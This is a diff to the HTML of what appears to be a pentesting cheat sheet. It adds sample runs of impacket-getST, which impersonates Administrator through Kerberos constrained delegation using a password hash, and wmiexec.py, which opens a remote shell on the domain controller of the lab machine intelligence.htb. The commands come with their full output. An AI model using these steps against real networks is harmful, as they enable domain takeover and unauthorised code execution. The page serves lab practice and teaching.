@@ -333,9 +333,26 @@ body.dark-mode #dynamicFormContainer button:hover {
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-get-a-service-ticket">1. Get a service ticket</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example, spn: www/dc.example.com <span class="o">(</span>Check Bloodhound<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getST -dc-ip &lt;DC_IP&gt; -spn &lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt; -hashes :&lt;HASH&gt; -impersonate Administrator &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.intelligence.htb <span class="o">&amp;&amp;</span> impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4 -impersonate Administrator <span class="s1">&#39;intelligence.htb/svc_int&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Getting TGT for user
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Impersonating Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2self
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2Proxy
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 </span></span></span></code></pre></div><h4 id="2-remote">2. Remote</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=Administrator.ccache
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; wmiexec.py -k -no-pass administrator@&lt;DC&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&lt;CCACHE_FILE&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; wmiexec.py -k -no-pass administrator@&lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.intelligence.htb <span class="o">&amp;&amp;</span> wmiexec.py -k -no-pass administrator@dc.intelligence.htb
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] SMBv3.0 dialect used
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Launching semi-interactive shell - Careful what you execute
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Press help for extra shell commands
+</span></span></span><span class="line"><span class="cl"><span class="go">C:\&gt;
 </span></span></span></code></pre></div><p><small><em>Note: impacket-wmiexec may not work</em></small></p></div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-to-do">1. TO-DO</h4>
